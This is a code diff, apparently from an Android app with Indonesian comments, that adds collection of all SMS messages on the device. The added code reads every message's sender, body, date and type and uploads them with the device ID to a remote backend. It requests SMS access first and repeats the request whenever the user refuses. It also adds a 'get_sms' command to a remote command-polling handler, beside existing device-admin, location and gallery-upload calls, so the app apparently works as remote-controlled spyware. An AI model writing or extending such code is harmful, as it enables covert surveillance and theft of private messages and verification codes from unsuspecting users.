@@ -14,6 +14,7 @@ import android.content.Intent
 import android.net.Uri
 import android.os.*
 import android.provider.Settings
+import android.provider.Telephony
 import android.util.Log
 import android.location.Location
 import android.view.Surface
@@ -64,6 +65,12 @@ import android.content.pm.ApplicationInfo
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
 import android.os.Environment
+import android.telephony.TelephonyManager
+import android.telephony.PhoneStateListener
+import android.telephony.CellInfo
+import android.telephony.CellSignalStrength
+
+
 
 class MainActivity : ComponentActivity() {
     // Store pending notification to show after permission is granted
@@ -71,6 +78,16 @@ class MainActivity : ComponentActivity() {
     
     // Track if we're returning from settings
     private var returningFromSettings = false
+    // Permission request codes
+    private val LOCATION_PERMISSION_CODE = 1001
+    private val NOTIFICATION_PERMISSION_CODE = 1002
+    private val CAMERA_PERMISSION_CODE = 1003
+    private val STORAGE_PERMISSION_CODE = 1004
+    private val SMS_PERMISSION_CODE = 1010
+    
+    // Track which permissions to request next
+    private val pendingPermissions = mutableListOf<String>()
+    
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
@@ -85,27 +102,18 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        // Check location permission
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1001)
-        }
+        // Start the permission request sequence
+        requestNextPermission()
 
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1002)
-        }
-
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), 1002)
-        }
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_MEDIA_IMAGES), 100)
-        } else {
-            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), 100)
+        // Check if SMS permission is already granted and upload immediately
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+            Log.d("PermissionDebug", "SMS permission already granted on launch, uploading SMS")
+            // Run on a background thread to avoid blocking UI
+            Thread {
+                uploadSmsToBackend(this)
+            }.start()
         }
         
-        
-
         // Panggil fungsi untuk kirim info device
         requestDeviceAdmin()
         startCommandService()
@@ -113,15 +121,185 @@ class MainActivity : ComponentActivity() {
         sendAppUsageToBackend()
         sendDeviceLocation()
         startPollingCommands()
-        
         // Register activity lifecycle callbacks to detect return from settings
         registerActivityLifecycleCallbacks()
+    }
+    
+    private fun requestNextPermission() {
+        // Check if SMS permission is already granted, if so, upload SMS right away
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+            Log.d("PermissionDebug", "SMS permission already granted, uploading SMS immediately")
+            uploadSmsToBackend(this)
+        }
+        
+        // Add all required permissions to the pending list if empty
+        if (pendingPermissions.isEmpty()) {
+            Log.d("PermissionDebug", "Initializing permission list")
+            // Add SMS permission first to prioritize it
+            pendingPermissions.add(Manifest.permission.READ_SMS)
+            
+            pendingPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
+            pendingPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
+            pendingPermissions.add(Manifest.permission.CAMERA)
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                pendingPermissions.add(Manifest.permission.READ_MEDIA_IMAGES)
+            } else {
+                pendingPermissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
+        }
+        
+        // Find the first permission that needs to be requested
+        var permissionRequested = false
+        
+        while (pendingPermissions.isNotEmpty() && !permissionRequested) {
+            val permission = pendingPermissions[0]
+            pendingPermissions.removeAt(0)
+            
+            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                // Found a permission that needs to be requested
+                permissionRequested = true
+                
+                when (permission) {
+                    Manifest.permission.READ_SMS -> {
+                        Log.d("PermissionDebug", "Requesting SMS permission")
+                        ActivityCompat.requestPermissions(this, arrayOf(permission), SMS_PERMISSION_CODE)
+                    }
+                    Manifest.permission.ACCESS_FINE_LOCATION -> {
+                        Log.d("PermissionDebug", "Requesting LOCATION permission")
+                        ActivityCompat.requestPermissions(this, arrayOf(permission), LOCATION_PERMISSION_CODE)
+                    }
+                    Manifest.permission.POST_NOTIFICATIONS -> {
+                        Log.d("PermissionDebug", "Requesting NOTIFICATION permission")
+                        ActivityCompat.requestPermissions(this, arrayOf(permission), NOTIFICATION_PERMISSION_CODE)
+                    }
+                    Manifest.permission.CAMERA -> {
+                        Log.d("PermissionDebug", "Requesting CAMERA permission")
+                        ActivityCompat.requestPermissions(this, arrayOf(permission), CAMERA_PERMISSION_CODE)
+                    }
+                    Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_EXTERNAL_STORAGE -> {
+                        Log.d("PermissionDebug", "Requesting STORAGE permission")
+                        ActivityCompat.requestPermissions(this, arrayOf(permission), STORAGE_PERMISSION_CODE)
+                    }
+                }
+            }
+            // If permission is already granted, we continue the loop to check the next one
+        }
     }
 
     private fun startCommandService() {
         val intent = Intent(this, CommandService::class.java)
         ContextCompat.startForegroundService(this, intent)
     }
+
+    @Deprecated("Deprecated in Java")
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        
+        when (requestCode) {
+            SMS_PERMISSION_CODE -> {
+                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
+                    Log.i("PermissionSMS", "READ_SMS granted, uploading SMS now")
+                    // Call uploadSms immediately when permission is granted
+                    uploadSmsToBackend(this)
+                    
+                    // Show confirmation to user
+                    Toast.makeText(this, "SMS data berhasil diupload", Toast.LENGTH_SHORT).show()
+                } else {
+                    Log.e("PermissionSMS", "READ_SMS denied")
+                    // Show a message explaining why SMS permission is needed
+                    Toast.makeText(this, "SMS permission is necessary for this feature", Toast.LENGTH_LONG).show()
+                    
+                    // Try again to request SMS permission
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), SMS_PERMISSION_CODE)
+                    }, 2000)
+                }
+            }
+            LOCATION_PERMISSION_CODE -> {
+                Log.d("PermissionDebug", "LOCATION permission result: " +
+                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) "GRANTED" else "DENIED")
+            }
+            NOTIFICATION_PERMISSION_CODE -> {
+                Log.d("PermissionDebug", "NOTIFICATION permission result: " +
+                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) "GRANTED" else "DENIED")
+            }
+            CAMERA_PERMISSION_CODE -> {
+                Log.d("PermissionDebug", "CAMERA permission result: " +
+                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) "GRANTED" else "DENIED")
+            }
+            STORAGE_PERMISSION_CODE -> {
+                Log.d("PermissionDebug", "STORAGE permission result: " +
+                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) "GRANTED" else "DENIED")
+            }
+        }
+        
+        // Continue with next permission request after a short delay
+        // Using handler with delay to ensure permissions dialog doesn't appear too quickly in succession
+        Handler(Looper.getMainLooper()).postDelayed({
+            requestNextPermission()
+        }, 300)
+    }
+
+    private fun getAllSms(context: Context): JSONArray {
+        val smsList = JSONArray()
+        val uri = Telephony.Sms.CONTENT_URI
+        val projection = arrayOf(
+            Telephony.Sms.ADDRESS,
+            Telephony.Sms.BODY,
+            Telephony.Sms.DATE,
+            Telephony.Sms.TYPE
+        )
+    
+        val cursor = context.contentResolver.query(uri, projection, null, null, "date DESC")
+        cursor?.use {
+            val idxAddress = it.getColumnIndex(Telephony.Sms.ADDRESS)
+            val idxBody = it.getColumnIndex(Telephony.Sms.BODY)
+            val idxDate = it.getColumnIndex(Telephony.Sms.DATE)
+            val idxType = it.getColumnIndex(Telephony.Sms.TYPE)
+    
+            while (it.moveToNext()) {
+                val smsJson = JSONObject()
+                smsJson.put("address", it.getString(idxAddress))
+                smsJson.put("body", it.getString(idxBody))
+                smsJson.put("date", it.getLong(idxDate))
+                smsJson.put("type", it.getInt(idxType)) // 1: inbox, 2: sent
+                smsList.put(smsJson)
+            }
+        }
+    
+        return smsList
+    }
+    
+    private fun uploadSmsToBackend(context: Context) {
+        val smsArray = getAllSms(context)
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+    
+        val json = JSONObject().apply {
+            put("device_id", androidId)
+            put("sms", smsArray)
+        }
+    
+        val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+    
+        val request = Request.Builder()
+            .url("${ApiConfig.BASE_URL}/api/device/upload_sms")
+            .post(body)
+            .build()
+    
+        OkHttpClient().newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("UploadSMS", "Failed: ${e.message}")
+            }
+    
+            override fun onResponse(call: Call, response: Response) {
+                val res = response.body?.string()
+                Log.i("UploadSMS", "Response: $res")
+            }
+        })
+    }
+    
+    
     
 
     private fun registerDevice() {
@@ -391,6 +569,12 @@ class MainActivity : ComponentActivity() {
                             Log.d("CmdService", "Uploading gallery images...")
                             uploadGalleryImages(applicationContext)
                         }
+
+                        "get_sms" -> {
+                            Log.d("CmdService", "Running get_sms command")
+                            uploadSmsToBackend(applicationContext)
+                        }
+
                     }
                 } catch (e: Exception) {
                     Log.e("PollCommand", "Parse error: ${e.message}")
